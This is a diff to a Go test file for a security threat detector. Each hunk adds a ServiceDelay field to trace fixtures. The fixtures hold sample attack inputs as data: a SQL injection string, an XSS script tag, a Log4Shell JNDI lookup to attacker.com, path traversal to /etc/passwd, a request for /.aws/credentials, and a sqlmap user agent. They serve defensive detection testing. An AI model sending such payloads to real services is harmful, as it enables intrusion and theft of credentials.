@@ -30,7 +30,7 @@ func TestSecurityThreatDetector_Comprehensive(t *testing.T) {
 		{
 			name: "SQL Injection attempt",
 			traces: []*telemetry.TraceRecord{
-				{SourceIP: "1.1.1.1", Path: "/api/user?id=1' OR '1'='1", Method: "GET", Timestamp: now},
+				{ServiceDelay: 1, SourceIP: "1.1.1.1", Path: "/api/user?id=1' OR '1'='1", Method: "GET", Timestamp: now},
 			},
 			expectedAnom:   1,
 			expectedType:   "security_scan",
@@ -39,7 +39,7 @@ func TestSecurityThreatDetector_Comprehensive(t *testing.T) {
 		{
 			name: "XSS attempt",
 			traces: []*telemetry.TraceRecord{
-				{SourceIP: "2.2.2.2", Path: "/search?q=<script>alert(1)</script>", Method: "GET", Timestamp: now},
+				{ServiceDelay: 1, SourceIP: "2.2.2.2", Path: "/search?q=<script>alert(1)</script>", Method: "GET", Timestamp: now},
 			},
 			expectedAnom:   1,
 			expectedType:   "security_scan",
@@ -50,7 +50,7 @@ func TestSecurityThreatDetector_Comprehensive(t *testing.T) {
 			traces: func() []*telemetry.TraceRecord {
 				var r []*telemetry.TraceRecord
 				for range 15 {
-					r = append(r, &telemetry.TraceRecord{SourceIP: "3.3.3.3", Path: "/login", Method: "POST", Status: "401 Unauthorized", Timestamp: now})
+					r = append(r, &telemetry.TraceRecord{ServiceDelay: 1, SourceIP: "3.3.3.3", Path: "/login", Method: "POST", Status: "401 Unauthorized", Timestamp: now})
 				}
 				return r
 			}(),
@@ -61,7 +61,7 @@ func TestSecurityThreatDetector_Comprehensive(t *testing.T) {
 		{
 			name: "Known scanning tool",
 			traces: []*telemetry.TraceRecord{
-				{SourceIP: "4.4.4.4", Path: "/", Method: "GET", UserAgent: "sqlmap/1.4.11", Timestamp: now},
+				{ServiceDelay: 1, SourceIP: "4.4.4.4", Path: "/", Method: "GET", UserAgent: "sqlmap/1.4.11", Timestamp: now},
 			},
 			expectedAnom:   1,
 			expectedType:   "security_threat",
@@ -70,7 +70,7 @@ func TestSecurityThreatDetector_Comprehensive(t *testing.T) {
 		{
 			name: "Sensitive file access",
 			traces: []*telemetry.TraceRecord{
-				{SourceIP: "5.5.5.5", Path: "/.aws/credentials", Method: "GET", Timestamp: now},
+				{ServiceDelay: 1, SourceIP: "5.5.5.5", Path: "/.aws/credentials", Method: "GET", Timestamp: now},
 			},
 			expectedAnom:   1,
 			expectedType:   "honeypot_hit",
@@ -79,7 +79,7 @@ func TestSecurityThreatDetector_Comprehensive(t *testing.T) {
 		{
 			name: "Log4Shell attempt",
 			traces: []*telemetry.TraceRecord{
-				{SourceIP: "6.6.6.6", Path: "/?q=${jndi:ldap://attacker.com/a}", Method: "GET", Timestamp: now},
+				{ServiceDelay: 1, SourceIP: "6.6.6.6", Path: "/?q=${jndi:ldap://attacker.com/a}", Method: "GET", Timestamp: now},
 			},
 			expectedAnom:   1,
 			expectedType:   "security_scan",
@@ -88,7 +88,7 @@ func TestSecurityThreatDetector_Comprehensive(t *testing.T) {
 		{
 			name: "Path traversal",
 			traces: []*telemetry.TraceRecord{
-				{SourceIP: "7.7.7.7", Path: "/../../etc/passwd", Method: "GET", Timestamp: now},
+				{ServiceDelay: 1, SourceIP: "7.7.7.7", Path: "/../../etc/passwd", Method: "GET", Timestamp: now},
 			},
 			expectedAnom:   1,
 			expectedType:   "security_scan",
@@ -168,7 +168,7 @@ func TestSecurityThreatDetector_WAFHits(t *testing.T) {
 
 	data := &DiagnosticData{
 		Traces: []*telemetry.TraceRecord{
-			{SourceIP: "8.8.8.8", Path: "/api", Method: "POST", Status: "403 Forbidden", Timestamp: now},
+			{ServiceDelay: 1, SourceIP: "8.8.8.8", Path: "/api", Method: "POST", Status: "403 Forbidden", Timestamp: now},
 		},
 		SecurityThreats: []*telemetry.SecurityThreat{
 			// As the store reads back a request the WAF refused.
@@ -205,9 +205,9 @@ func TestSecurityThreatDetector_CoordinatedAttack(t *testing.T) {
 		var traces []*telemetry.TraceRecord
 		for i := 1; i <= 30; i++ {
 			ip := fmt.Sprintf("192.168.1.%d", i)
-			traces = append(traces, &telemetry.TraceRecord{SourceIP: ip, Path: "/", Method: "GET", Timestamp: now, UserAgent: fmt.Sprintf("UA-%d", i)})
-			traces = append(traces, &telemetry.TraceRecord{SourceIP: ip, Path: "/login", Method: "GET", Timestamp: now.Add(time.Second), UserAgent: fmt.Sprintf("UA-%d", i)})
-			traces = append(traces, &telemetry.TraceRecord{SourceIP: ip, Path: "/dashboard", Method: "GET", Timestamp: now.Add(2 * time.Second), UserAgent: fmt.Sprintf("UA-%d", i)})
+			traces = append(traces, &telemetry.TraceRecord{ServiceDelay: 1, SourceIP: ip, Path: "/", Method: "GET", Timestamp: now, UserAgent: fmt.Sprintf("UA-%d", i)})
+			traces = append(traces, &telemetry.TraceRecord{ServiceDelay: 1, SourceIP: ip, Path: "/login", Method: "GET", Timestamp: now.Add(time.Second), UserAgent: fmt.Sprintf("UA-%d", i)})
+			traces = append(traces, &telemetry.TraceRecord{ServiceDelay: 1, SourceIP: ip, Path: "/dashboard", Method: "GET", Timestamp: now.Add(2 * time.Second), UserAgent: fmt.Sprintf("UA-%d", i)})
 		}
 
 		data := &DiagnosticData{
@@ -236,9 +236,9 @@ func TestSecurityThreatDetector_CoordinatedAttack(t *testing.T) {
 		ja4 := "t13d1516h2_8c224e757c16_0d2e82e5b8e9"
 		for i := 1; i <= 10; i++ {
 			ip := fmt.Sprintf("10.0.0.%d", i)
-			traces = append(traces, &telemetry.TraceRecord{SourceIP: ip, Path: "/wp-login.php", Method: "POST", Timestamp: now, UserAgent: ua, JA4: ja4})
-			traces = append(traces, &telemetry.TraceRecord{SourceIP: ip, Path: "/xmlrpc.php", Method: "POST", Timestamp: now.Add(time.Millisecond), UserAgent: ua, JA4: ja4})
-			traces = append(traces, &telemetry.TraceRecord{SourceIP: ip, Path: "/admin-ajax.php", Method: "POST", Timestamp: now.Add(2 * time.Millisecond), UserAgent: ua, JA4: ja4})
+			traces = append(traces, &telemetry.TraceRecord{ServiceDelay: 1, SourceIP: ip, Path: "/wp-login.php", Method: "POST", Timestamp: now, UserAgent: ua, JA4: ja4})
+			traces = append(traces, &telemetry.TraceRecord{ServiceDelay: 1, SourceIP: ip, Path: "/xmlrpc.php", Method: "POST", Timestamp: now.Add(time.Millisecond), UserAgent: ua, JA4: ja4})
+			traces = append(traces, &telemetry.TraceRecord{ServiceDelay: 1, SourceIP: ip, Path: "/admin-ajax.php", Method: "POST", Timestamp: now.Add(2 * time.Millisecond), UserAgent: ua, JA4: ja4})
 		}
 
 		data := &DiagnosticData{
@@ -268,7 +268,7 @@ func TestSecurityThreatDetector_CoordinatedAttack(t *testing.T) {
 		// harmful traffic. The same rhythm on successful GETs is a poller and is
 		// not reported (TestPollersAreNotThreats).
 		for i := 0; i < 15; i++ {
-			traces = append(traces, &telemetry.TraceRecord{
+			traces = append(traces, &telemetry.TraceRecord{ServiceDelay: 1,
 				SourceIP:  ip,
 				Path:      "/login",
 				Method:    "POST",
@@ -302,7 +302,7 @@ func TestSecurityThreatDetector_CoordinatedAttack(t *testing.T) {
 			if i > 255 {
 				ip = fmt.Sprintf("10.1.2.%d", i%255)
 			}
-			traces = append(traces, &telemetry.TraceRecord{SourceIP: ip, Path: "/", Method: "GET", Status: "404 Not Found", Timestamp: now, ServiceName: "app"})
+			traces = append(traces, &telemetry.TraceRecord{ServiceDelay: 1, SourceIP: ip, Path: "/", Method: "GET", Status: "404 Not Found", Timestamp: now, ServiceName: "app"})
 		}
 
 		engine := NewAnomalyAnalysisEngine(&gateonv1.GlobalConfig{
@@ -315,7 +315,7 @@ func TestSecurityThreatDetector_CoordinatedAttack(t *testing.T) {
 		// Single IP with slightly suspicious but low-volume activity
 		ipNoise := "192.168.50.50"
 		for i := 0; i < 5; i++ {
-			data.Traces = append(data.Traces, &telemetry.TraceRecord{SourceIP: ipNoise, Path: "/debug", Method: "GET", Status: "404 Not Found", Timestamp: now, ServiceName: "app"})
+			data.Traces = append(data.Traces, &telemetry.TraceRecord{ServiceDelay: 1, SourceIP: ipNoise, Path: "/debug", Method: "GET", Status: "404 Not Found", Timestamp: now, ServiceName: "app"})
 		}
 
 		anomalies := engine.Analyze(ctx, data)
@@ -340,7 +340,7 @@ func TestSecurityThreatDetector_CoordinatedAttack(t *testing.T) {
 		for i := 1; i <= 5; i++ {
 			ip := fmt.Sprintf("172.16.0.%d", i)
 			for _, p := range paths {
-				traces = append(traces, &telemetry.TraceRecord{SourceIP: ip, Path: p, Method: "GET", Timestamp: now})
+				traces = append(traces, &telemetry.TraceRecord{ServiceDelay: 1, SourceIP: ip, Path: p, Method: "GET", Timestamp: now})
 			}
 		}
 
